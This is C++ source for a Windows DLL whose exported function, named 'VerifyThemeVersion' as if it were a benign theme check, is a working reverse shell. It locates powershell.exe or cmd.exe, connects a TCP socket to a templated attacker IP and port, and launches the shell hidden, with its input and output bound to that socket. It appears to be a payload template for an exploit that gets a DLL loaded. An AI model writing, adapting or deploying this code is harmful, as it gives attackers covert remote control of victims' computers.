#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32")

extern "C" __declspec(dllexport) int VerifyThemeVersion(void)
{
    auto ip = "{{IP_ADDR}}";
    auto port = "{{PORT}}";
    const char* binaries[]{
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "C:\\Windows\\System32\\cmd.exe",
        "powershell.exe",
        "cmd.exe"
    };

    char filename[MAX_PATH]{ 0 };

    for (auto& bin : binaries)
    {
        if (GetFileAttributesA(bin) != INVALID_FILE_ATTRIBUTES 
            && GetLastError() != ERROR_FILE_NOT_FOUND)
        {
            strcpy(filename, bin);
            break;
        }
        else if (SearchPathA(nullptr, bin, nullptr, MAX_PATH, filename, nullptr))
        {
            break;
        }
    }

    WSADATA wsaData{0};
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    addrinfo hints { 0 };
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    addrinfo* info = nullptr;
    auto addrinfoError = getaddrinfo(ip, port, &hints, &info);

    auto sock = WSASocketW(info->ai_family, info->ai_socktype, info->ai_protocol, 0, 0, 0);
    WSAConnect(sock, info->ai_addr, static_cast<int>(info->ai_addrlen), 0, 0, 0, 0);

    STARTUPINFOA si{ 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = reinterpret_cast<HANDLE>(sock);
    si.hStdOutput = reinterpret_cast<HANDLE>(sock);
    si.hStdError = reinterpret_cast<HANDLE>(sock);

    PROCESS_INFORMATION pi{ 0 };
    CreateProcessA(0, filename, 0, 0, 1, 0, 0, 0, &si, &pi);

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);            
    freeaddrinfo(info);
    WSACleanup();
    return 0;
}